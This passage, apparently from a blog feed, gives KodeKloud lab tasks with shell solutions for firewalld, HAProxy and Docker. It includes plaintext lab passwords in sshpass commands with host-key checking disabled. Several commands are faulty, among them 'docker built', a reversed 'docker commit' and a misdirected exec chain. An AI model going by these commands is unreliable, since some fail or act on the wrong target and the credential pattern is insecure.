</span></span><span style="display:flex;"><span>vi +&lt;line&gt; &lt;configfile&gt; <span style="color:#75715e">#e.g vi +34 /etc/httpd/conf/httpd.conf and fix the line!</span>
</span></span><span style="display:flex;"><span>systemctl start httpd
</span></span><span style="display:flex;"><span>systemctl status httpd
</span></span><span style="display:flex;"><span>systemctl enable --now httpd
</span></span><span style="display:flex;"><span>curl &lt;hostname&gt;:3002
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-firewalld-setup">Linux Firewalld Setup</h2>
<ul>
<li>To secure our Nautilus infrastructure in Stratos Datacenter we have decided to install and configure firewalld on all app servers. We have Apache and Nginx services running on these apps. Nginx is running as a reverse proxy server for Apache. We might have more robust firewall settings in the future, but for now we have decided to go with the given requirements listed below:</li>
<li>a. Allow all incoming connections on Nginx port, i.e 80.</li>
<li>b. Block all incoming connections on Apache port, i.e 8080.</li>
<li>c. All rules must be permanent.</li>
<li>d. Zone should be public.</li>
<li>e. If Apache or Nginx services aren&rsquo;t running already, please make sure to start them</li>
</ul>
<h6 id="solution-16">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p &lt;password&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;user&gt;@&lt;hostname&gt;
</span></span><span style="display:flex;"><span>systemctl status httpd <span style="color:#75715e">#start if not</span>
</span></span><span style="display:flex;"><span>systemctl status nginx <span style="color:#75715e">#start if not</span>
</span></span><span style="display:flex;"><span>sudo yum install firewalld -y 
</span></span><span style="display:flex;"><span>sudo systemctl enable --now firewalld
</span></span><span style="display:flex;"><span>sudo systemctl status firewalld
</span></span><span style="display:flex;"><span>sudo firewall-cmd --permanent --zone<span style="color:#f92672">=</span>public --add-port<span style="color:#f92672">=</span>80/tcp
</span></span><span style="display:flex;"><span>sudo firewall-cmd --zone<span style="color:#f92672">=</span>public --add-rich-rule<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;rule family=&#34;ipv4&#34; source address=&#34;0.0.0.0/0&#34; port port=8080 protocol=&#34;tcp&#34; reject&#39;</span>
</span></span><span style="display:flex;"><span>sudo firewall-cmd --get-default-zone
</span></span><span style="display:flex;"><span>sudo firewall-cmd --list-all
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify from jump host</span>
</span></span><span style="display:flex;"><span>curl stapp01:80 <span style="color:#75715e">#you should get &#34;Working!&#34;</span>
</span></span><span style="display:flex;"><span>curl stapp02:8080 <span style="color:#75715e">#you should get &#34;connection refused msg&#34;</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="install-and-configure-haproxy-lbr">Install and Configure HaProxy LBR</h2>
<ul>
<li>There is a static website running in Stratos Datacenter. They have already configured the app servers and code is already deployed there. To make it work properly, they need to configure LBR server. There are number of options for that, but team has decided to go with HAproxy. FYI, apache is running on port 3002 on all app servers. Complete this task as per below details.</li>
<li>a. Install and configure HAproxy on LBR server using yum only and make sure all app servers are added to HAproxy load balancer. HAproxy must serve on default http port (Note: Please do not remove stats socket /var/lib/haproxy/stats entry from haproxy default config.).</li>
<li>b. Once done, you can access the website using StaticApp button on the top bar</li>
</ul>
<h6 id="solution-17">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>ssh loki@stlb01
</span></span><span style="display:flex;"><span>sudo yum install -y haproxy
</span></span><span style="display:flex;"><span>sudo vi /etc/haproxy/haproxy.cfg
</span></span><span style="display:flex;"><span><span style="color:#75715e">#make sure to bind on port 80, and to add all app servers within the backend app.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;frontend main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  bind *:80
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  acl url_static       path_beg       -i /static /images /javascript /stylesheets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  acl url_static       path_end       -i .jpg .gif .png .css .js
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  use_backend static          if url_static
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  default_backend             app
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">backend app
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  balance     roundrobin
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  server   app1 172.16.238.10:3002 check
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  server   app2 172.16.238.11:3002 check
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  server   app3 172.16.238.12:3002 check&#34;</span>   
</span></span><span style="display:flex;"><span><span style="color:#75715e">#save and quit</span>
</span></span><span style="display:flex;"><span>sudo systemctl restart haproxy
</span></span><span style="display:flex;"><span>curl localhost:80
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>curl stlb01:80
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="haproxy-lbr-troubleshooting">Haproxy LBR Troubleshooting</h2>
<ul>
<li>xFusionCorp Industries has an application running on Nautlitus infrastructure in Stratos Datacenter. The monitoring tool recognised that there is an issue with the haproxy service on LBR server. That needs to fixed to make the application work properly.</li>
<li>Troubleshoot and fix the issue, and make sure haproxy service is running on Nautilus LBR server. Once fixed, make sure you are able to access the website using StaticApp button on the top bar.</li>
</ul>
<h6 id="solution-18">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p Mischi3f ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no loki@stlb01
</span></span><span style="display:flex;"><span>sudo systemctl start haproxy
</span></span><span style="display:flex;"><span>sudo systemctl status haproxy
</span></span><span style="display:flex;"><span>haproxy -f /etc/haproxy/haproxy.cfg -c
</span></span><span style="display:flex;"><span><span style="color:#75715e">#I got misspelling errors in line 51,58 and 32</span>
</span></span><span style="display:flex;"><span>sudo vi +51 /etc/haproxy/haproxy.cfg
</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;bind *:80&#34;</span> <span style="color:#75715e">#line 32 within the frontend main</span>
</span></span><span style="display:flex;"><span>&gt; <span style="color:#e6db74">&#34;roundrobin&#34;</span> <span style="color:#75715e">#line 51 and 58 within the backend static/app </span>
</span></span><span style="display:flex;"><span>haproxy -f /etc/haproxy/haproxy.cfg -c
</span></span><span style="display:flex;"><span>sudo systemctl restart haproxy
</span></span><span style="display:flex;"><span>sudo systemctl status haproxy  
</span></span></code></pre></div></li>
</ul>
]]></content></item><item><title>Certifications exam notes</title><link>https://chxmxii.github.io/portfolio/posts/2023/08/certifications-exam-notes/</link><pubDate>Tue, 08 Aug 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/08/certifications-exam-notes/</guid><description>These are some useful notes I gathered while pursuing my certifications RHCE EX294 Notes and tips
RHCCS EX188 Notes and tips
RHCSA EX200 Notes and tips
AWS CCP Exam Notes and tips</description><content type="html"><![CDATA[<h3 id="these-are-some-useful-notes-i-gathered-while-pursuing-my-certifications">These are some useful notes I gathered while pursuing my certifications</h3>
<ul>
<li>
<p><a href="https://chxmxii.github.io/portfolio/rhce/main.html">RHCE EX294 Notes and tips</a></p>
</li>
<li>
<p><a href="https://chxmxii.github.io/portfolio/rhccs/rhccs.html">RHCCS EX188 Notes and tips</a></p>
</li>
<li>
<p><a href="https://chxmxii.gitbook.io/system-management-tasks/">RHCSA EX200 Notes and tips</a></p>
</li>
<li>
<p><a href="https://chxmxii.gitbook.io/aws-ccp/">AWS CCP Exam Notes and tips</a></p>
</li>
</ul>
]]></content></item><item><title>KodeKloud Engineer Docker Challenges</title><link>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-docker-challenges/</link><pubDate>Mon, 07 Aug 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-docker-challenges/</guid><description>Docker Ports Mapping The Nautilus DevOps team is planning to host an application on a nginx-based container. There are number of tickets already been created for similar tasks. One of the tickets has been assigned to set up a nginx container on Application Server 1 in Stratos Datacenter. Please perform the task as per details mentioned below: a. Pull nginx:stable docker image on Application Server 1. b. Create a container named cluster using the image you pulled.</description><content type="html"><![CDATA[<hr>
<h2 id="docker-ports-mapping">Docker Ports Mapping</h2>
<ul>
<li>The Nautilus DevOps team is planning to host an application on a nginx-based container. There are number of tickets already been created for similar tasks. One of the tickets has been assigned to set up a nginx container on Application Server 1 in Stratos Datacenter. Please perform the task as per details mentioned below:</li>
<li>a. Pull nginx:stable docker image on Application Server 1.</li>
<li>b. Create a container named cluster using the image you pulled.</li>
<li>c. Map host port 5000 to container port 80. Please keep the container in running state.</li>
</ul>
<h6 id="solution">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pull the docker image</span>
</span></span><span style="display:flex;"><span>sudo docker pull nginx:stable
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run the container</span>
</span></span><span style="display:flex;"><span>sudo docker run -itd --name cluster -p 5000:80 nginx:stable
</span></span><span style="display:flex;"><span>&gt;itd - --interactive + --tty + --detach
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="run-a-docker-container">Run a Docker Container:</h2>
<ul>
<li>Nautilus DevOps team is testing some applications deployment on some of the application servers. They need to deploy a nginx container on Application Server 3. Please complete the task as per details given below:</li>
<li>On Application Server 3 create a container named nginx_3 using image nginx with alpine tag and make sure container is in running state.</li>
</ul>
<h6 id="solution-1">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to stapp03</span>
</span></span><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run the container</span>
</span></span><span style="display:flex;"><span>docker run -d --name nginx_3 -p 8080:80 nginx:alpine
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>docker ps -a
</span></span><span style="display:flex;"><span>docker images
</span></span><span style="display:flex;"><span>curl -I localhost:8080
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="docker-copy-operaton">Docker Copy Operaton:</h2>
<ul>
<li>The Nautilus DevOps team has some conditional data present on App Server 1 in Stratos Datacenter. There is a container ubuntu_latest running on the same server. We received a request to copy some of the data from the docker host to the container. Below are more details about the task:</li>
<li>On App Server 1 in Stratos Datacenter copy an encrypted file /tmp/nautilus.txt.gpg from docker host to ubuntu_latest container (running on same server) in /usr/src/ location. Please do not try to modify this file in any way.</li>
</ul>
<h6 id="solution-2">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span>docker ps
</span></span><span style="display:flex;"><span>docker cp /tmp/nautilus.txt.gpg ubuntu_latest:/usr/src/
</span></span><span style="display:flex;"><span>docker exec &lt;container_id&gt; ls /usr/src/
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="docker-container-issue">Docker Container Issue</h2>
<ul>
<li>There is a static website running within a container named nautilus, this container is running on App Server 1. Suddenly, we started facing some issues with the static website on App Server 1. Look into the issue to fix the same, you can find more details below:</li>
<li>Container&rsquo;s volume /usr/local/apache2/htdocs is mapped with the host&rsquo;s volume /var/www/html.</li>
<li>The website should run on host port 8080 on App Server 1 i.e command curl http://localhost:8080/ should work on App Server 1.</li>
</ul>
<h6 id="solution-3">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#inspect container so it matches the req</span>
</span></span><span style="display:flex;"><span>docker inspect &lt;container_id&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#list all containers</span>
</span></span><span style="display:flex;"><span>docker ps -a
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start the desired container</span>
</span></span><span style="display:flex;"><span>docker start &lt;docker_id&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>curl localhost:8080
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="pull-docker-image">Pull Docker Image</h2>
<ul>
<li>Nautilus project developers are planning to start testing on a new project. As per their meeting with the DevOps team, they want to test containerized environment application features. As per details shared with DevOps team, we need to accomplish the following task:</li>
<li>a. Pull busybox:musl image on App Server 1 in Stratos DC and re-tag (create new tag) this image as busybox:news</li>
</ul>
<h6 id="solution-4">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>docker image ls 
</span></span><span style="display:flex;"><span>docker pull busybox:musl
</span></span><span style="display:flex;"><span>docker images
</span></span><span style="display:flex;"><span>docker tag busybox:musl busybox:news
</span></span><span style="display:flex;"><span>docker images
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="write-a-docker-file">Write a Docker File</h2>
<ul>
<li>As per recent requirements shared by the Nautilus application development team, they need custom images created for one of their projects. Several of the initial testing requirements are already been shared with DevOps team. Therefore, create a docker file /opt/docker/Dockerfile (please keep D capital of Dockerfile) on App server 3 in Stratos DC and configure to build an image with the following requirements:</li>
<li>a. Use ubuntu as the base image.</li>
<li>b. Install apache2 and configure it to work on 5004 port. (do not update any other Apache configuration settings like document root etc).</li>
</ul>
<h6 id="solution-5">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span>cd /opt/docker/
</span></span><span style="display:flex;"><span>vi Dockerfile
</span></span><span style="display:flex;"><span><span style="color:#75715e">#build the image</span>
</span></span><span style="display:flex;"><span>docker built -t apache .
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run the container</span>
</span></span><span style="display:flex;"><span>docker run -d -p 5004:5004 --name docker apache
</span></span><span style="display:flex;"><span><span style="color:#75715e">#test</span>
</span></span><span style="display:flex;"><span>curl localhost:5004
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#f92672">&amp;&amp;</span> apt-get install -y apache2<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#39;s/Listen 80/Listen 5004/g&#39;</span> /etc/apache2/ports.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 5004</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;apache2ctl&#34;</span>,<span style="color:#e6db74">&#34;-D&#34;</span>,<span style="color:#e6db74">&#34;FOREGROUND&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="docker-update-permissions">Docker Update Permissions</h2>
<ul>
<li>One of the Nautilus project developers need access to run docker commands on App Server 2. This user is already created on the server. Accomplish this task as per details given below:</li>
<li>User mark is not able to run docker commands on App Server 2 in Stratos DC, make the required changes so that this user can run docker commands without sudo</li>
</ul>
<h6 id="solution-6">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p Am3ric@ ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no steve@stapp02
</span></span><span style="display:flex;"><span>sudo usermod -aG docker mark
</span></span><span style="display:flex;"><span>id mark
</span></span><span style="display:flex;"><span>su - mark
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>docker ps
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="docker-exec-operations">Docker EXEC Operations</h2>
<ul>
<li>One of the Nautilus DevOps team members was working to configure services on a kkloud container that is running on App Server 3 in Stratos Datacenter. Due to some personal work he is on PTO for the rest of the week, but we need to finish his pending work ASAP. Please complete the remaining work as per details given below:</li>
<li>a. Install apache2 in kkloud container using apt that is running on App Server 3 in Stratos Datacenter.</li>
<li>b. Configure Apache to listen on port 8084 instead of default http port. Do not bind it to listen on specific IP or hostname only, i.e it should listen on localhost, 127.0.0.1, container ip, etc.</li>
<li>c. Make sure Apache service is up and running inside the container. Keep the container in running state at the end.</li>
</ul>
<h6 id="solution-7">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p BigGr33n  ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span>docker ps
</span></span><span style="display:flex;"><span>docker exec -it kkloud apt-get install apache2 <span style="color:#f92672">&amp;&amp;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt; sed -i <span style="color:#e6db74">&#39;s/Listen 80/Listen 8084/g&#39;</span> /etc/apache2/ports.conf <span style="color:#f92672">&amp;&amp;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt; service apache start <span style="color:#f92672">&amp;&amp;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt; curl localhost:8084
</span></span><span style="display:flex;"><span>docker inspect -f <span style="color:#e6db74">&#34;{{ .NetworkSettings.IPAddress }}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">curl </span>$ip<span style="color:#e6db74">:8084
</span></span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="create-a-docker-image-from-container">Create a Docker Image From Container</h2>
<ul>
<li>One of the Nautilus developer was working to test new changes on a container. He wants to keep a backup of his changes to the container. A new request has been raised for the DevOps team to create a new image from this container. Below are more details about it:</li>
<li>a. Create an image demo:datacenter on Application Server 3 from a container ubuntu_latest that is running on same server.</li>
</ul>
<h6 id="solution-8">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p BigGr33n  ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span>docker ps
</span></span><span style="display:flex;"><span>docker image ls
</span></span><span style="display:flex;"><span>docker commit demo:datacenter ubuntu_latest
</span></span><span style="display:flex;"><span>docker image ls
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="create-a-docker-network">Create a Docker Network</h2>
<ul>
<li>The Nautilus DevOps team needs to set up several docker environments for different applications. One of the team members has been assigned a ticket where he has been asked to create some docker networks to be used later. Complete the task based on the following ticket description:</li>
<li>a. Create a docker network named as blog on App Server 2 in Stratos DC.</li>
<li>b. Configure it to use bridge drivers.</li>
<li>c. Set it to use subnet 192.168.0.0/24 and iprange 192.168.0.2/24.</li>
</ul>
<h6 id="solution-9">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p Am3ric@ ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no steve@stapp02
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span>docker network ls
</span></span><span style="display:flex;"><span>docker network create --driver<span style="color:#f92672">=</span>bridge --ip-range<span style="color:#f92672">=</span>192.168.0.2/24 --subnet<span style="color:#f92672">=</span>192.168.0.0/24 blog
</span></span><span style="display:flex;"><span>docker network inspect blog
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;blog&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;6cd0bae9b622286afb87eb284c36d14b20f23b242c69cae5bfede8b1b257191a&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Created&#34;</span>: <span style="color:#e6db74">&#34;2023-08-02T08:32:56.010259327Z&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Scope&#34;</span>: <span style="color:#e6db74">&#34;local&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Driver&#34;</span>: <span style="color:#e6db74">&#34;bridge&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;EnableIPv6&#34;</span>: false,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;IPAM&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Driver&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Options&#34;</span>: <span style="color:#f92672">{}</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Config&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                  <span style="color:#e6db74">&#34;Subnet&#34;</span>: <span style="color:#e6db74">&#34;192.168.0.0/24&#34;</span>,
</span></span><span style="display:flex;"><span>                  <span style="color:#e6db74">&#34;IPRange&#34;</span>: <span style="color:#e6db74">&#34;192.168.0.2/24&#34;</span>
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>docker network ls
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="docker-volumes-mapping">Docker Volumes Mapping</h2>
<ul>
<li>The Nautilus DevOps team is testing applications containerization, which issupposed to be migrated on docker container-based environments soon. In today&rsquo;s stand-up meeting one of the team members has been assigned a task to create and test a docker container with certain requirements. Below are more details:</li>
<li>a. On App Server 2 in Stratos DC pull nginx image (preferably latest tag but others should work too).</li>
<li>b. Create a new container with name beta from the image you just pulled.</li>
<li>c. Map the host volume /opt/security with container volume /usr/src/. There is an sample.txt file present on same server under /tmp; copy that file to /opt/security. Also please keep the container in running state.</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p Am3ric@ ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no steve@stapp02
</span></span><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>docker pull nginx:latest <span style="color:#75715e">#pull the nginx image</span>
</span></span><span style="display:flex;"><span>docker run -d --name beta -v /opt/security:/usr/src/:Z nginx:latest
</span></span><span style="display:flex;"><span>cp /tmp/sample.txt /opt/security/ <span style="color:#75715e">#copy the sample.txt file </span>
</span></span><span style="display:flex;"><span>docker exec -it beta cat /usr/src/sample.txt <span style="color:#75715e">#verify</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="save-load-and-transfer-docker-image">Save Load and Transfer Docker Image</h2>
<ul>
<li>One of the DevOps team members was working on to create a new custom docker image on App Server 1 in Stratos DC. He is done with his changes and image is saved on same server with name demo:devops. Recently a requirement has been raised by a team to use that image for testing, but the team wants to test the same on App Server 3. So we need to provide them that image on App Server 3 in Stratos DC.</li>
<li>a. On App Server 1 save the image demo:devops in an archive.</li>
<li>b. Transfer the image archive to App Server 3.</li>
<li>c. Load that image archive on App Server 3 with same name and tag which was used on App Server 1.</li>
<li>Note: Docker is already installed on both servers; however, if its service is down please make sure to start it.</li>
</ul>
<h6 id="solution-10">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span>docker images 
</span></span><span style="display:flex;"><span>docker save demo:devops -o /tmp/demo.tar
</span></span><span style="display:flex;"><span>scp /tmp/demo.tar banner@stapp03:/tmp/
</span></span><span style="display:flex;"><span>docker inspect --format <span style="color:#e6db74">&#34;{{ .Config.Cmd }}&#34;</span> demo:devops <span style="color:#75715e">#2verify</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>/bin/bash<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span>docker load -i /tmp/demo.tar
</span></span><span style="display:flex;"><span>docker inspect --format <span style="color:#e6db74">&#34;{{ .Config.Cmd }}&#34;</span> demo:devops <span style="color:#75715e">#2verify</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>/bin/bash<span style="color:#f92672">]</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="write-a-docker-compose-file">Write a Docker Compose File</h2>
<ul>
<li>The Nautilus application development team shared static website content that needs to be hosted on the httpd web server using a containerised platform. The team has shared details with the DevOps team, and we need to set up an environment according to those guidelines. Below are the details:</li>
<li>a. On App Server 3 in Stratos DC create a container named httpd using a docker compose file /opt/docker/docker-compose.yml (please use the exact name for file).</li>
<li>b. Use httpd (preferably latest tag) image for container and make sure container is named as httpd; you can use any name for service.</li>
<li>c. Map 80 number port of container with port 5004 of docker host.</li>
<li>d. Map container&rsquo;s /usr/local/apache2/htdocs volume with /opt/itadmin volume of docker host which is already there. (please do not modify any data within these locations).</li>
</ul>
<h6 id="solution-11">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span>cd /opt/docker
</span></span><span style="display:flex;"><span>vi docker-compose.yml
</span></span><span style="display:flex;"><span>docker-compose up -d
</span></span><span style="display:flex;"><span>docker ps
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">httpd</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">httpd:latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">httpd</span>
